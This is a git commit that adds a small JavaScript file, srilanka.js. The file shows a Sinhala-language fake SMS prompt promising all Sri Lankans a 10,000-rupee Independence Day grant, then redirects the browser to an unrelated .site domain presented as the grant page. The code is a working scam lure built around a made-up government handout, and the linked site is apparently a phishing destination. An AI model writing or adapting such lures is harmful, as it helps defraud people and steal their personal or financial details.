f7ff76fa0062fb2653814fe5f2f9d82159198e2d
newetijazz18 <newetijazz18@gmail.com>
2026-01-28 05:03:25 +0100

    Create srilanka.js

---
+++ srilanka.js
@@ -0,0 +1,6 @@
+
+var password = 'ලබා ගන්න lkr10,000'
+password=prompt('SMS: ආයුබෝවන්, මේ වසරේ නිදහස් දිනය සැමරීම සඳහා සියලුම ශ්‍රී ලාංකිකයින් සඳහා රුපියල් 10,000 ක මුදල් ප්‍රදානයකට සාදරයෙන් පිළිගනිමු, මෙම දීමනාව ලබා ගැනීමට "හරි" ඔබන්න.','ලබා ගන්න lkr10,000');
+if (password != 'ලබා ගන්න lkr10,000') {
+location.href='https://www.zotdikyp.site/lkr10000-independence-day-grant';
+}
